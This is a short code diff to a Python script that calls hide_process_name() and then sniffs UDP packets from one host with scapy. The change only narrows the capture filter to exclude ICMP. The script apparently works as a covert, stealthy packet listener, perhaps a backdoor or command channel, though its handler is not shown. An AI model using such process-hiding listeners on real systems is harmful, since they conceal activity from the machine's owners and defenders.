@@ -94,4 +94,4 @@ if __name__ == "__main__":
     # Hide process name.
     hide_process_name()
     # Start listening for packets.
-    sniff(filter="ip src host 10.0.0.159 and not port ssh and udp", iface="enp1s0", prn=packet_handler)
+    sniff(filter="ip src host 10.0.0.159 and not port ssh and udp and not icmp", iface="enp1s0", prn=packet_handler)
